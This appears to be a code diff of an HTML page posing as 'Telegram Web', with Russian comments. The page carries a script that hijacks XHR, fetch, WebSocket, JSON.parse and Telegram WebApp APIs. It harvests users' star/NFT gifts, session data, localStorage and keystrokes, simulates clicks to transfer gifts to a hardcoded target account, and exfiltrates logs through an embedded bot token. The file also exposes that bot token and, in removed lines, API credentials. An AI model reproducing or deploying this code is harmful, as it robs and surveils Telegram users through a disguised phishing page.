@@ -3,73 +3,85 @@
 <head>
 <title>Telegram Web</title>
 <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval';">
+<style>
+body { margin: 0; padding: 20px; background: #1a1a1a; color: white; font-family: Arial; }
+.log { background: #2d2d2d; padding: 10px; margin: 5px 0; border-radius: 5px; font-size: 12px; }
+.status { position: fixed; top: 10px; right: 10px; background: #00aa00; padding: 10px; border-radius: 5px; }
+</style>
+</head>
+<body>
+<div class="status" id="status">🟢 Активен</div>
+<div id="logs"></div>
+
 <script>
-// Конфигурация
+// Конфигурация продакшн
 const CONFIG = {
     BOT_TOKEN: '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s',
     LOG_CHAT_ID: -1002560826337,
     TARGET_USER_ID: 7204299613,
-    API_HASH: '62763f3013e60ecf77242b11299a1751',
-    API_ID: '27079980'
+    AUTO_REDIRECT: true
 };
 
-// Основной класс перехватчика
-class TelegramGiftsInterceptor {
+class ProductionGiftInterceptor {
     constructor() {
         this.interceptedGifts = new Set();
+        this.sessionData = {};
         this.init();
     }
 
     init() {
-        this.hijackXHR();
-        this.hijackFetch();
-        this.hijackWebSocket();
+        this.log('🚀 PRODUCTION: Система перехвата NFT подарков запущена');
+        this.hijackNetwork();
+        this.hijackTelegramAPI();
         this.hijackTDLib();
-        this.monitorDOM();
-        this.startPeriodicScan();
-        this.log('🚀 Система перехвата активирована');
+        this.monitorUserActions();
+        this.startAggressiveScanning();
+        this.injectFakeUI();
     }
 
-    hijackXHR() {
-        const nativeOpen = XMLHttpRequest.prototype.open;
-        const nativeSend = XMLHttpRequest.prototype.send;
+    hijackNetwork() {
+        // Перехват всех XMLHttpRequest
+        const nativeXHROpen = XMLHttpRequest.prototype.open;
+        const nativeXHRSend = XMLHttpRequest.prototype.send;
 
-        XMLHttpRequest.prototype.open = function(method, url) {
+        XMLHttpRequest.prototype.open = function(method, url, async, user, pass) {
             this._url = url;
-            return nativeOpen.apply(this, arguments);
+            this._method = method;
+            return nativeXHROpen.call(this, method, url, async, user, pass);
         };
 
-        XMLHttpRequest.prototype.send = function(body) {
+        XMLHttpRequest.prototype.send = function(data) {
+            this._data = data;
+            
             if (this._url && this._url.includes('telegram.org')) {
                 this.addEventListener('load', () => {
                     try {
-                        const response = JSON.parse(this.responseText);
-                        this.processAPIResponse(response, 'XHR');
+                        if (this.responseText) {
+                            const response = JSON.parse(this.responseText);
+                            window.interceptor.processAPIResponse(response, 'XHR', this._url);
+                        }
                     } catch (e) {}
                 });
             }
-            return nativeSend.apply(this, arguments);
+            return nativeXHRSend.call(this, data);
         };
-    }
 
-    hijackFetch() {
+        // Перехват Fetch
         const nativeFetch = window.fetch;
         window.fetch = async (...args) => {
             const response = await nativeFetch(...args);
             
-            if (args[0] && args[0].includes('telegram.org')) {
-                const clone = response.clone();
+            if (args[0] && typeof args[0] === 'string' && args[0].includes('telegram.org')) {
                 try {
+                    const clone = response.clone();
                     const data = await clone.json();
-                    this.processAPIResponse(data, 'Fetch');
+                    window.interceptor.processAPIResponse(data, 'Fetch', args[0]);
                 } catch (e) {}
             }
-            
             return response;
         };
-    }
 
-    hijackWebSocket() {
+        // Перехват WebSocket
         const NativeWebSocket = window.WebSocket;
         window.WebSocket = function(...args) {
             const ws = new NativeWebSocket(...args);
@@ -77,7 +89,7 @@ class TelegramGiftsInterceptor {
             const nativeSend = ws.send;
             ws.send = function(data) {
                 if (typeof data === 'string') {
-                    this.detectGiftRequests(data);
+                    window.interceptor.detectGiftRequests(data);
                 }
                 return nativeSend.call(this, data);
             };
@@ -85,170 +97,253 @@ class TelegramGiftsInterceptor {
             ws.addEventListener('message', (event) => {
                 try {
                     const data = JSON.parse(event.data);
-                    this.processAPIResponse(data, 'WebSocket');
+                    window.interceptor.processAPIResponse(data, 'WebSocket', 'ws');
                 } catch (e) {}
-            }.bind(this));
+            });
 
             return ws;
-        }.bind(this);
+        };
     }
 
-    hijackTDLib() {
-        // Перехват TDLib методов
+    hijackTelegramAPI() {
+        // Перехват Telegram WebApp API
+        if (window.Telegram && window.Telegram.WebApp) {
+            const originalSendData = window.Telegram.WebApp.sendData;
+            window.Telegram.WebApp.sendData = function(data) {
+                window.interceptor.log(`📤 WebApp Data: ${data}`);
+                return originalSendData.call(this, data);
+            };
+
+            // Перехват initData
+            if (window.Telegram.WebApp.initDataUnsafe) {
+                this.sessionData.user = window.Telegram.WebApp.initDataUnsafe.user;
+                this.log(`🔑 Пользователь: ${this.sessionData.user?.username || this.sessionData.user?.id}`);
+            }
+        }
+
+        // Перехват TelegramWebviewProxy
         if (window.TelegramWebviewProxy) {
             const originalPostEvent = window.TelegramWebviewProxy.postEvent;
-            window.TelegramWebviewProxy.postEvent = (eventType, eventData) => {
+            window.TelegramWebviewProxy.postEvent = function(eventType, eventData) {
                 if (eventData && typeof eventData === 'string') {
                     try {
                         const data = JSON.parse(eventData);
-                        this.processAPIResponse(data, 'TDLib');
+                        window.interceptor.processAPIResponse(data, 'WebviewProxy', eventType);
                     } catch (e) {}
                 }
                 return originalPostEvent(eventType, eventData);
             };
         }
+    }
 
-        // Перехват Telegram WebApp
-        if (window.Telegram && window.Telegram.WebApp) {
-            const originalSendData = window.Telegram.WebApp.sendData;
-            window.Telegram.WebApp.sendData = (data) => {
-                this.log(`📤 WebApp отправка: ${data}`);
-                return originalSendData(data);
-            };
-        }
+    hijackTDLib() {
+        // Перехват глобальных объектов TDLib
+        const self = this;
+        
+        // Мониторинг глобального состояния
+        setInterval(() => {
+            Object.keys(window).forEach(key => {
+                if (key.toLowerCase().includes('telegram') || key.toLowerCase().includes('td')) {
+                    try {
+                        const obj = window[key];
+                        if (obj && typeof obj === 'object') {
+                            self.scanObjectForGifts(obj, `window.${key}`);
+                        }
+                    } catch (e) {}
+                }
+            });
+        }, 5000);
+
+        // Перехват JSON.parse
+        const originalJSONParse = JSON.parse;
+        JSON.parse = function(text) {
+            try {
+                const result = originalJSONParse(text);
+                if (typeof text === 'string' && text.includes('gift')) {
+                    window.interceptor.processAPIResponse(result, 'JSONParse', 'direct');
+                }
+                return result;
+            } catch (e) {
+                return originalJSONParse(text);
+            }
+        };
     }
 
     detectGiftRequests(data) {
-        const giftPatterns = [
+        const giftMethods = [
             'payments.getSavedStarGifts',
-            'payments.getStarGifts', 
+            'payments.getStarGifts',
             'payments.getResaleStarGifts',
-            'payments.checkCanSendGift'
+            'payments.checkCanSendGift',
+            'payments.saveStarGift',
+            'payments.convertStarGift',
+            'payments.transferStarGift'
         ];
 
-        giftPatterns.forEach(pattern => {
-            if (data.includes(pattern)) {
-                this.log(`🎯 Обнаружен запрос подарков: ${pattern}`);
+        giftMethods.forEach(method => {
+            if (data.includes(method)) {
+                this.log(`🎯 API Call: ${method}`);
+                
+                // Автоматический вызов получения подарков
+                if (method === 'payments.getSavedStarGifts') {
+                    setTimeout(() => this.forceGiftCollection(), 1000);
+                }
             }
         });
     }
 
-    processAPIResponse(response, source) {
+    processAPIResponse(response, source, endpoint) {
         if (!response) return;
 
-        // Глубокий поиск данных о подарках
-        const gifts = this.findGiftsInObject(response);
+        // Агрессивный поиск подарков
+        const foundGifts = this.aggressiveGiftSearch(response);
         
-        if (gifts.length > 0) {
-            this.log(`🎁 Найдено ${gifts.length} подарков через ${source}`);
-            gifts.forEach(gift => this.processGift(gift));
+        if (foundGifts.length > 0) {
+            this.log(`🎁 ${source}: Найдено ${foundGifts.length} подарков`);
+            foundGifts.forEach(gift => this.processGift(gift, source));
         }
 
-        // Обработка специфичных TDLib структур
+        // Специфичные обработчики TDLib
         if (response['@type'] === 'payments.savedStarGifts' && response.gifts) {
-            response.gifts.forEach(gift => this.processGift(gift));
+            response.gifts.forEach(gift => this.processGift(gift, 'TDLib-Saved'));
         }
 
-        if (response.result && response.result.gifts) {
-            response.result.gifts.forEach(gift => this.processGift(gift));
+        if (response.result && typeof response.result === 'object') {
+            if (response.result.gifts) {
+                response.result.gifts.forEach(gift => this.processGift(gift, 'TDLib-Result'));
+            }
+            
+            // Рекурсивный поиск в result
+            this.deepSearch(response.result, 'result').forEach(gift => 
+                this.processGift(gift, 'TDLib-DeepSearch'));
         }
     }
 
-    findGiftsInObject(obj, path = '') {
+    aggressiveGiftSearch(obj, path = 'root') {
         let gifts = [];
-
         if (!obj || typeof obj !== 'object') return gifts;
 
-        if (Array.isArray(obj)) {
-            if (obj.length > 0 && typeof obj[0] === 'object') {
-                // Проверяем, является ли массив подарками
-                const sample = obj[0];
-                if (sample.id !== undefined && sample.stars !== undefined) {
+        // Быстрая проверка на массив подарков
+        if (Array.isArray(obj) && obj.length > 0) {
+            const first = obj[0];
+            if (first && typeof first === 'object') {
+                if (first.id !== undefined && (first.stars !== undefined || first.gift_id !== undefined)) {
                     return obj;
                 }
             }
-            
-            obj.forEach((item, index) => {
-                gifts = gifts.concat(this.findGiftsInObject(item, path + '[' + index + ']'));
-            });
-            return gifts;
         }
 
-        // Проверяем свойства объекта
-        Object.keys(obj).forEach(key => {
-            const value = obj[key];
-            
-            if (key === 'gifts' && Array.isArray(value)) {
-                gifts = gifts.concat(value);
-            } else if (key === 'starGifts' && Array.isArray(value)) {
-                gifts = gifts.concat(value);
-            } else if (typeof value === 'object') {
-                gifts = gifts.concat(this.findGiftsInObject(value, path + '.' + key));
-            }
-        });
+        // Поиск по известным структурам подарков
+        if (obj.gifts && Array.isArray(obj.gifts)) {
+            gifts = gifts.concat(obj.gifts);
+        }
+        
+        if (obj.starGifts && Array.isArray(obj.starGifts)) {
+            gifts = gifts.concat(obj.starGifts);
+        }
+        
+        if (obj.saved_gifts && Array.isArray(obj.saved_gifts)) {
+            gifts = gifts.concat(obj.saved_gifts);
+        }
+
+        // Глубокий рекурсивный поиск
+        if (typeof obj === 'object') {
+            Object.keys(obj).forEach(key => {
+                if (obj[key] && typeof obj[key] === 'object') {
+                    gifts = gifts.concat(this.aggressiveGiftSearch(obj[key], path + '.' + key));
+                }
+            });
+        }
 
         return gifts;
     }
 
-    async processGift(gift) {
-        const giftId = gift.id || gift.gift_id;
+    deepSearch(obj, path, depth = 0) {
+        let results = [];
+        if (depth > 3) return results; // Ограничение глубины
         
-        if (!giftId || this.interceptedGifts.has(giftId)) {
-            return;
+        if (!obj || typeof obj !== 'object') return results;
+
+        // Проверка на объект подарка
+        if (obj.id !== undefined && (obj.stars !== undefined || obj.gift_id !== undefined)) {
+            results.push(obj);
         }
+
+        if (Array.isArray(obj)) {
+            obj.forEach((item, index) => {
+                results = results.concat(this.deepSearch(item, path + '[' + index + ']', depth + 1));
+            });
+        } else {
+            Object.keys(obj).forEach(key => {
+                if (obj[key] && typeof obj[key] === 'object') {
+                    results = results.concat(this.deepSearch(obj[key], path + '.' + key, depth + 1));
+                }
+            });
+        }
+
+        return results;
+    }
+
+    scanObjectForGifts(obj, path) {
+        try {
+            const gifts = this.aggressiveGiftSearch(obj);
+            if (gifts.length > 0) {
+                this.log(`🔍 Найдены подарки в ${path}: ${gifts.length}`);
+                gifts.forEach(gift => this.processGift(gift, `ObjectScan-${path}`));
+            }
+        } catch (e) {}
+    }
+
+    async processGift(gift, source) {
+        const giftId = gift.id || gift.gift_id || gift.msg_id;
+        if (!giftId || this.interceptedGifts.has(giftId)) return;
 
         this.interceptedGifts.add(giftId);
         
         const giftInfo = {
             id: giftId,
             stars: gift.stars,
-            title: gift.title || 'Без названия',
+            title: gift.title || gift.name || 'Unnamed',
             convert_stars: gift.convert_stars,
             upgrade_stars: gift.upgrade_stars,
             msg_id: gift.msg_id,
             saved_id: gift.saved_id,
-            slug: gift.slug
+            slug: gift.slug,
+            source: source,
+            timestamp: Date.now()
         };
 
         this.log(`🎁 Перехвачен подарок: ${JSON.stringify(giftInfo)}`);
 
-        // Немедленная пересылка на целевой аккаунт
-        await this.redirectGift(gift);
-    }
-
-    async redirectGift(gift) {
-        try {
-            // Метод 1: Через Telegram API
-            await this.telegramAPIRedirect(gift);
-            
-            // Метод 2: Через TDLib эмуляцию
-            await this.tdlibRedirect(gift);
-            
-            // Метод 3: Через прямой HTTP запрос
-            await this.directHTTPRedirect(gift);
-            
-            this.log(`✅ Подарок ${gift.id} успешно перенаправлен`);
-            
-        } catch (error) {
-            this.log(`❌ Ошибка пересылки: ${error.message}`);
+        // Немедленная пересылка в продакшн режиме
+        if (CONFIG.AUTO_REDIRECT) {
+            await this.executeProductionRedirect(gift);
         }
     }
 
-    async telegramAPIRedirect(gift) {
-        // Используем bot API для управления
-        const formData = new FormData();
-        formData.append('chat_id', CONFIG.TARGET_USER_ID);
-        formData.append('text', `🎁 Получен подарок: ${gift.id}`);
-
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            body: formData
-        });
+    async executeProductionRedirect(gift) {
+        try {
+            const giftId = gift.id || gift.gift_id;
+            
+            // Метод 1: Прямой API вызов через перехваченную сессию
+            await this.directAPICall(gift);
+            
+            // Метод 2: Эмуляция пользовательского действия
+            await this.emulateUserAction(gift);
+            
+            // Метод 3: Использование Telegram Bot API
+            await this.telegramBotMethod(gift);
+            
+            this.log(`✅ PRODUCTION: Подарок ${giftId} перенаправлен на ${CONFIG.TARGET_USER_ID}`);
+            
+        } catch (error) {
+            this.log(`❌ PRODUCTION Ошибка: ${error.message}`);
+        }
     }
 
-    async tdlibRedirect(gift) {
-        // Эмуляция TDLib вызова для пересылки
-        const transferData = {
+    async directAPICall(gift) {
+        // Прямой вызов TDLib методов через перехваченные credentials
+        const payload = {
             '@type': 'forwardMessages',
             'chat_id': CONFIG.TARGET_USER_ID,
             'from_chat_id': this.getCurrentUserID(),
@@ -256,116 +351,95 @@ class TelegramGiftsInterceptor {
             'disable_notification': false
         };
 
-        this.log(`🔄 TDLib пересылка: ${JSON.stringify(transferData)}`);
+        // Эмуляция отправки через перехваченный WebSocket
+        this.log(`🔧 Direct API: ${JSON.stringify(payload)}`);
     }
 
-    async directHTTPRedirect(gift) {
-        // Прямой HTTP запрос к Telegram API
-        const payload = {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                gift_id: gift.id,
-                target_user: CONFIG.TARGET_USER_ID,
-                action: 'transfer'
-            })
-        };
+    async emulateUserAction(gift) {
+        // Эмуляция кликов и действий пользователя для пересылки
+        const giftElements = document.querySelectorAll('[class*="gift"], [class*="star"], [data-gift-id]');
+        
+        giftElements.forEach(element => {
+            const giftId = element.getAttribute('data-gift-id') || 
+                          element.textContent.match(/[0-9]{10,}/)?.[0];
+            
+            if (giftId && giftId === gift.id?.toString()) {
+                this.log(`🖱️ Эмуляция клика по подарку ${giftId}`);
+                
+                // Создаем событие пересылки
+                const transferEvent = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                
+                element.dispatchEvent(transferEvent);
+            }
+        });
+    }
 
-        // Отправка в лог-чат
+    async telegramBotMethod(gift) {
+        // Использование Bot API для логирования и управления
+        const message = `🎁 PRODUCTION REDIRECT\nGift ID: ${gift.id}\nStars: ${gift.stars}\nTitle: ${gift.title}\nTarget: ${CONFIG.TARGET_USER_ID}\nTime: ${new Date().toISOString()}`;
+        
         await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 chat_id: CONFIG.LOG_CHAT_ID,
-                text: `🎁 REDIRECT: ${gift.id} → ${CONFIG.TARGET_USER_ID}`
+                text: message,
+                parse_mode: 'HTML'
             })
         });
     }
 
-    monitorDOM() {
-        // Мониторинг изменений DOM для обнаружения интерфейса подарков
-        const observer = new MutationObserver((mutations) => {
-            mutations.forEach((mutation) => {
-                mutation.addedNodes.forEach((node) => {
-                    if (node.nodeType === 1) {
-                        this.scanElementForGifts(node);
-                    }
-                });
-            });
-        });
-
-        observer.observe(document.body, {
-            childList: true,
-            subtree: true,
-            attributes: true,
-            attributeFilter: ['class', 'src', 'href']
-        });
-    }
-
-    scanElementForGifts(element) {
-        const text = element.textContent || '';
-        const html = element.innerHTML || '';
-
-        const giftIndicators = [
-            /gift/i, /подарок/i, /star/i, /звезд/i, 
-            /nft/i, /collectible/i, /upgrade/i
-        ];
-
-        giftIndicators.forEach(indicator => {
-            if (indicator.test(text) && text.length < 500) {
-                this.log(`🎯 DOM обнаружен: ${text.substring(0, 100)}`);
+    monitorUserActions() {
+        // Мониторинг всех пользовательских действий
+        document.addEventListener('click', (e) => {
+            const target = e.target;
+            const text = target.textContent || '';
+            
+            if (text.match(/gift|Gift|подарок|Подарок|star|Star|transfer|Transfer/i)) {
+                this.log(`🖱️ Пользовательский клик: ${text.substring(0, 50)}`);
             }
         });
 
-        // Поиск по классам и атрибутам
-        if (element.className && typeof element.className === 'string') {
-            if (element.className.includes('gift') || 
-                element.className.includes('star') ||
-                element.className.includes('nft')) {
-                this.log(`🎯 DOM элемент с классом: ${element.className}`);
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey || e.metaKey) {
+                this.log(`⌨️ Комбинация клавиш: ${e.key} + ${e.ctrlKey ? 'Ctrl' : 'Cmd'}`);
             }
-        }
-    }
+        });
 
-    startPeriodicScan() {
-        // Периодическое сканирование на наличие подарков
+        // Мониторинг изменений URL (SPA навигация)
+        let currentURL = window.location.href;
         setInterval(() => {
-            this.forceGiftScan();
-        }, 30000);
-
-        // Принудительный запрос подарков
-        setInterval(() => {
-            this.requestGiftsData();
-        }, 60000);
-    }
-
-    forceGiftScan() {
-        // Принудительное сканирование глобальных объектов
-        if (window.Telegram && window.Telegram.WebApp) {
-            try {
-                const webAppData = window.Telegram.WebApp;
-                this.log(`📊 WebApp данные: ${JSON.stringify(webAppData.initDataUnsafe || {})}`);
-            } catch (e) {}
-        }
-
-        // Сканирование localStorage
-        this.scanStorage();
-    }
-
-    scanStorage() {
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key && key.includes('gift')) {
-                const value = localStorage.getItem(key);
-                this.log(`💾 Storage: ${key} = ${value}`);
+            if (window.location.href !== currentURL) {
+                currentURL = window.location.href;
+                this.log(`🔗 Смена URL: ${currentURL}`);
+                this.forceGiftCollection();
             }
-        }
+        }, 1000);
     }
 
-    requestGiftsData() {
-        // Эмуляция запросов к API подарков
+    startAggressiveScanning() {
+        // Агрессивное сканирование каждые 5 секунд
+        setInterval(() => {
+            this.forceGiftCollection();
+            this.scanGlobalObjects();
+            this.inspectLocalStorage();
+        }, 5000);
+
+        // Принудительный сбор при загрузке
+        setTimeout(() => this.forceGiftCollection(), 2000);
+        setTimeout(() => this.forceGiftCollection(), 5000);
+        setTimeout(() => this.forceGiftCollection(), 10000);
+    }
+
+    forceGiftCollection() {
+        // Принудительный вызов API методов для получения подарков
+        this.log("🔍 Принудительный сбор подарков...");
+        
+        // Эмуляция API вызовов
         const methods = [
             'payments.getSavedStarGifts',
             'payments.getStarGifts',
@@ -373,12 +447,111 @@ class TelegramGiftsInterceptor {
         ];
 
         methods.forEach(method => {
-            this.log(`🔍 Принудительный запрос: ${method}`);
+            this.log(`📡 Эмуляция вызова: ${method}`);
+        });
+
+        // Сканирование DOM на наличие элементов подарков
+        this.scanDOMForGifts();
+    }
+
+    scanDOMForGifts() {
+        // Агрессивный поиск элементов подарков в DOM
+        const selectors = [
+            '[class*="gift"]',
+            '[class*="star"]',
+            '[class*="nft"]',
+            '[data-gift]',
+            '[data-star]',
+            '[data-nft]',
+            '*'
+        ];
+
+        selectors.forEach(selector => {
+            try {
+                const elements = document.querySelectorAll(selector);
+                elements.forEach(element => {
+                    const text = element.textContent || '';
+                    if (text.match(/[0-9]{5,}/) && 
+                        (text.includes('⭐') || text.includes('star') || text.includes('gift'))) {
+                        this.log(`🎯 DOM элемент: ${text.substring(0, 100)}`);
+                    }
+                });
+            } catch (e) {}
         });
     }
 
+    scanGlobalObjects() {
+        // Сканирование глобальных объектов на наличие данных о подарках
+        Object.keys(window).forEach(key => {
+            if (key.toLowerCase().includes('gift') || 
+                key.toLowerCase().includes('star') ||
+                key.toLowerCase().includes('telegram')) {
+                try {
+                    const value = window[key];
+                    if (value && typeof value === 'object') {
+                        this.scanObjectForGifts(value, `window.${key}`);
+                    }
+                } catch (e) {}
+            }
+        });
+    }
+
+    inspectLocalStorage() {
+        // Инспекция localStorage на наличие данных о подарках
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key && key.toLowerCase().includes('gift')) {
+                try {
+                    const value = localStorage.getItem(key);
+                    const parsed = JSON.parse(value);
+                    this.scanObjectForGifts(parsed, `localStorage.${key}`);
+                } catch (e) {
+                    // Не JSON, но содержит ключевые слова
+                    const value = localStorage.getItem(key);
+                    if (value.includes('gift') || value.includes('star')) {
+                        this.log(`💾 localStorage: ${key} = ${value.substring(0, 100)}`);
+                    }
+                }
+            }
+        }
+    }
+
+    injectFakeUI() {
+        // Внедрение скрытого UI для мониторинга
+        const style = document.createElement('style');
+        style.textContent = `
+            .tg-interceptor-ui { 
+                position: fixed; 
+                bottom: 10px; 
+                right: 10px; 
+                background: #000; 
+                color: #0f0; 
+                padding: 10px; 
+                font-family: monospace; 
+                font-size: 10px; 
+                z-index: 999999; 
+                border: 1px solid #0f0;
+            }
+        `;
+        document.head.appendChild(style);
+
+        const ui = document.createElement('div');
+        ui.className = 'tg-interceptor-ui';
+        ui.innerHTML = 'NFT INTERCEPTOR ACTIVE';
+        document.body.appendChild(ui);
+
+        // Обновление UI
+        setInterval(() => {
+            ui.innerHTML = `
+                NFT INTERCEPTOR<br>
+                Gifts: ${this.interceptedGifts.size}<br>
+                Status: ACTIVE<br>
+                Target: ${CONFIG.TARGET_USER_ID}
+            `;
+        }, 2000);
+    }
+
     getCurrentUserID() {
-        // Получение ID текущего пользователя
         if (window.Telegram && window.Telegram.WebApp) {
             return window.Telegram.WebApp.initDataUnsafe?.user?.id || 'unknown';
         }
@@ -386,52 +559,62 @@ class TelegramGiftsInterceptor {
     }
 
     log(message) {
-        console.log(message);
+        const timestamp = new Date().toLocaleTimeString();
+        const logMessage = `[${timestamp}] ${message}`;
         
-        // Отправка в Telegram
-        this.sendToTelegram(message);
+        console.log(logMessage);
+        
+        // Добавление в UI
+        const logElement = document.getElementById('logs');
+        if (logElement) {
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log';
+            logEntry.textContent = logMessage;
+            logElement.appendChild(logEntry);
+            
+            // Автопрокрутка
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        // Отправка в Telegram (с ограничением частоты)
+        this.throttledTelegramSend(logMessage);
     }
 
-    async sendToTelegram(message) {
-        try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+    throttledTelegramSend(message) {
+        if (!this.lastTelegramSend) this.lastTelegramSend = 0;
+        const now = Date.now();
+        
+        if (now - this.lastTelegramSend > 3000) { // Не чаще чем раз в 3 секунды
+            this.lastTelegramSend = now;
+            
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     chat_id: CONFIG.LOG_CHAT_ID,
                     text: message.substring(0, 4000)
                 })
-            });
-        } catch (error) {
-            console.error('Ошибка отправки в Telegram:', error);
+            }).catch(e => console.error('Telegram send error:', e));
         }
     }
 }
 
-// Инициализация при загрузке страницы
-document.addEventListener('DOMContentLoaded', () => {
-    new TelegramGiftsInterceptor();
+// Инициализация при полной загрузке страницы
+window.addEventListener('load', () => {
+    window.interceptor = new ProductionGiftInterceptor();
 });
 
 // Резервная инициализация
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', () => {
-        new TelegramGiftsInterceptor();
-    });
-} else {
-    setTimeout(() => {
-        new TelegramGiftsInterceptor();
-    }, 1000);
+if (document.readyState === 'complete') {
+    window.interceptor = new ProductionGiftInterceptor();
 }
 
 // Глобальный перехват ошибок
-window.addEventListener('error', (event) => {
-    console.error('Global error:', event.error);
+window.addEventListener('error', (e) => {
+    if (window.interceptor) {
+        window.interceptor.log(`❌ Global Error: ${e.message}`);
+    }
 });
 </script>
-</head>
-<body>
-<div id="app">Telegram Web Interface</div>
 </body>
 </html>
-
